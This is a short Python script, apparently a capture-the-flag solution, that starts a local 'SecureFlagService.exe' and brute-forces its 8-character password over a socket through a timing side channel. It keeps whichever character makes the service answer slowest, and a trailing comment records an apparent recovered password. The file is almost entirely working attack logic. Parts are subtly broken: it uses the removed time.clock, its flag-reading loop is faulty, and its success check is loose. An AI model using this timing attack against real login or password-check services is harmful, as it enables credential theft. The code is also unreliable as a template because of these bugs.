#!/usr/bin/env python

import socket
import sys, string, os
import time


# Making a list with all the possible chars:
r = list(range(65, 91))
t = list(range(97, 123))
s = list(range(48, 58))
for i in t:
    r.append(i)
for i in s:
    r.append(i)
ch = []
for i in r:
    ch.append(chr(i))

BUFFER_SIZE = 10000
SIZE = 1000

def make_pass(str):
    if len(str) < 8:
        for i in range(8 - len(str)):
            str += '*'
    return (str)


def send_pass(str):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('127.0.0.1', 1234))
    data = s.recv(BUFFER_SIZE)
    s.send(bytes(str, 'utf8'))
    m1 = int(round(time.clock() * SIZE))
    data = s.recv(BUFFER_SIZE)
    data = data.decode('utf8')
    m2 = int(round(time.clock() * SIZE))
    # flag = ""
    if data == "f":
        # If we found the password we will print the flag.
        while len(data) != 0:
            data = s.recv(BUFFER_SIZE)
            data += data.decode('utf8')
        print("The flag is: " + data)
    s.close()
    return (m2 - m1, data)


def time_att():
    password = ""
    a = []
    for r in range(8):
        max = 0
        c_max = None
        for c in ch:
            t, f = send_pass(make_pass(password + c))
            if t > max:
                max = t
                c_max = c
            if f != "":
                print("The password is: " + password +c)
        password += c_max


os.startfile("SecureFlagService.exe")



time_att()

#print(get_pass("NX66SUsZ"))

# NX66SUsZ

